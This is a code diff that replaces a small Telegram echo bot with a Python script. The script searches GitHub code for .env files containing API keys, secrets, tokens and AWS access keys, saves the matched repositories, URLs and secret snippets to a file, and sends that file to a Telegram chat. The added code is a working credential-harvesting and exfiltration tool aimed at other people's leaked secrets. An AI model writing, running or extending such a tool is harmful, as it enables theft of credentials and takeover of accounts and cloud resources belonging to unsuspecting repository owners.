@@ -1,29 +1,57 @@
+import requests
 import os
 import time
-import telebot
+from telebot import TeleBot
 
-# Получаем токен и ID из переменных окружения
-TOKEN = os.getenv("TELEGRAM_TOKEN")
+# Получаем токен и chat_id из окружения
+TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
+bot = TeleBot(TOKEN)
 
-if not TOKEN or not CHAT_ID:
-    print("ОШИБКА: Переменные окружения TELEGRAM_TOKEN или CHAT_ID не установлены!")
-    exit()
+# Настройки GitHub поиска
+SEARCH_KEYWORDS = ['API_KEY=', 'SECRET=', 'EMAIL=', 'TOKEN=', 'AWS_ACCESS_KEY_ID']
+GITHUB_SEARCH_URL = 'https://api.github.com/search/code'
+HEADERS = {'Accept': 'application/vnd.github.v3.text-match+json'}
+RESULTS_PER_PAGE = 10
+OUTPUT_FILE = 'github_env_leaks.txt'
 
-bot = telebot.TeleBot(TOKEN)
+def search_github(keyword, page=1):
+    params = {
+        'q': f'{keyword} in:file filename:.env',
+        'page': page,
+        'per_page': RESULTS_PER_PAGE
+    }
+    response = requests.get(GITHUB_SEARCH_URL, headers=HEADERS, params=params)
+    if response.status_code == 200:
+        return response.json().get('items', [])
+    return []
 
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    bot.reply_to(message, "Бот работает! Привет!")
+def extract_info(item):
+    repo = item['repository']['full_name']
+    url = item['html_url']
+    snippet = ''
+    for match in item.get('text_matches', []):
+        snippet += match.get('fragment', '') + '\n'
+    return f"{repo} | {url} | {snippet.strip()}"
 
-@bot.message_handler(func=lambda message: True)
-def echo_all(message):
-    bot.send_message(CHAT_ID, f"Ты написал: {message.text}")
+def write_results():
+    with open(OUTPUT_FILE, 'w', encoding='utf-8') as f:
+        for keyword in SEARCH_KEYWORDS:
+            for page in range(1, 2):  # Страниц можно больше, если будешь с токеном GitHub
+                results = search_github(keyword, page)
+                for item in results:
+                    info = extract_info(item)
+                    if info:
+                        f.write(info + '\n' + '-' * 80 + '\n')
+                time.sleep(2)
 
-# Бесконечный polling
-while True:
-    try:
-        bot.polling()
-    except Exception as e:
-        print(f"Ошибка: {e}")
-        time.sleep(5)
+def send_to_telegram():
+    if os.path.exists(OUTPUT_FILE) and os.path.getsize(OUTPUT_FILE) > 0:
+        with open(OUTPUT_FILE, 'rb') as f:
+            bot.send_document(chat_id=CHAT_ID, document=f)
+    else:
+        bot.send_message(chat_id=CHAT_ID, text="Ничего не найдено.")
+
+if __name__ == '__main__':
+    write_results()
+    send_to_telegram()
